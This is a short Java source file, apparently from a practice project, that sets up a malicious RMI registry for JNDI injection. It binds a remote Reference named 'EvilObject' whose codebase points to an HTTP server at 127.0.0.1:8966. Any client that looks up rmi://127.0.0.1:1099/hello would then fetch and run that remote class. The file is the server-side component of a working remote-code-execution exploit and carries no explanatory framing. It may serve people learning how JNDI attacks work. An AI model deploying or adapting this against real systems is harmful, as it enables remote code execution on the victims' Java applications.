package com.dahe.hello.controller.JNDI;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

// JNDI + RMI 服务
// rmi://127.0.0.1:1099/hello
public class JNDIRmiServer {
    void register() throws Exception {
        LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8966/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        Naming.bind("rmi://127.0.0.1:1099/hello", refObjWrapper);
        System.out.println("Registry运行中......");
    }

    public static void main(String[] args) throws Exception {
        new JNDIRmiServer().register();
    }
}